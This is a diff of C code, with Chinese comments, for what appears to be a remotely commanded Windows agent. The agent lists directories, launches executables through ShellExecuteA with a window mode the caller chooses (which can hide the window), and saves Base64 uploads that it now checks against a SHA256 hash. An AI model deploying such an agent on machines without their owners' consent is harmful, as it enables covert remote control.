@@ -100,8 +100,8 @@ char* list_directory(const char* path) {
 }
 
 // 执行指定路径的 exe 文件
-int run_executable(const char* path) {
-    HINSTANCE result = ShellExecuteA(NULL, "open", path, NULL, NULL, SW_SHOWNORMAL);
+int run_executable(const char* path, int mode) {
+    HINSTANCE result = ShellExecuteA(NULL, "open", path, NULL, NULL, mode);
     return (intptr_t)result > 32 ? 0 : -1;
 }
 
@@ -189,6 +189,7 @@ typedef struct {
     char* b64_content;        // Base64 缓存
     long b64_len;              // 当前 Base64 长度
     long b64_capacity;         // Base64 缓存容量
+    char expected_hash[65];   // 存储期望的 SHA256 值
 } ReceivedFile;
 
 extern ReceivedFile current_file;
@@ -218,7 +219,6 @@ int handle_file_upload(ParsedCommand cmd) {
             current_file.size = atol(line + 5);
             current_file.b64_capacity = current_file.size * 2;
 
-            // 分配 Base64 缓存
             if (current_file.b64_content) {
                 free(current_file.b64_content);
             }
@@ -234,7 +234,6 @@ int handle_file_upload(ParsedCommand cmd) {
             const char* data = line + 5;
             int data_len = strlen(data);
 
-            // 动态扩容
             if (current_file.b64_len + data_len + 1 >= current_file.b64_capacity) {
                 current_file.b64_capacity += 1024;
                 char* new_buf = (char*)realloc(current_file.b64_content, current_file.b64_capacity + 1);
@@ -249,24 +248,50 @@ int handle_file_upload(ParsedCommand cmd) {
             current_file.b64_len += data_len;
         }
 
+        else if (strncmp(line, "HASH:", 5) == 0) {
+            strncpy(current_file.expected_hash, line + 5, 64);
+            current_file.expected_hash[64] = '\0';
+            printf("[+] Expected SHA256: %s\n", current_file.expected_hash);
+        }
+
         else if (strcmp(line, "UPLOADEND") == 0) {
             if (!current_file.b64_content || current_file.b64_len == 0) {
                 printf("[!] No data received\n");
                 return -1;
             }
 
-            // 解码并写入文件
+            // 解码 Base64
             DWORD decoded_len = 0;
             BYTE* decoded = base64_decode(current_file.b64_content, current_file.b64_len, &decoded_len);
             if (decoded && decoded_len > 0) {
-                current_file.fp = fopen(current_file.filename, "wb");
-                if (current_file.fp) {
-                    fwrite(decoded, 1, decoded_len, current_file.fp);
-                    fclose(current_file.fp);
-                    printf("[+] File saved: %s (%ld bytes)\n", current_file.filename, decoded_len);
+                // 计算 SHA256
+                char actual_hash[65];
+                if (compute_sha256(decoded, decoded_len, actual_hash) != 0) {
+                    printf("[-] SHA256 calculation failed\n");
+                    free(decoded);
+                    return -1;
+                }
+
+                // 校验
+                if (strlen(current_file.expected_hash) == 64 &&
+                    memcmp(current_file.expected_hash, actual_hash, 64) == 0) {
+                    printf("[+] SHA256 verified: %s\n", actual_hash);
+
+                    // 保存文件
+                    current_file.fp = fopen(current_file.filename, "wb");
+                    if (current_file.fp) {
+                        fwrite(decoded, 1, decoded_len, current_file.fp);
+                        fclose(current_file.fp);
+                        printf("[+] File saved: %s (%ld bytes)\n", current_file.filename, decoded_len);
+                    }
+                    else {
+                        printf("[!] Failed to open file: %s\n", current_file.filename);
+                    }
                 }
                 else {
-                    printf("[!] Failed to open file: %s\n", current_file.filename);
+                    printf("[-] SHA256 verification failed!\n");
+                    printf("[-] Expected: %s\n", current_file.expected_hash);
+                    printf("[-] Actual:   %s\n", actual_hash);
                 }
             }
             else {
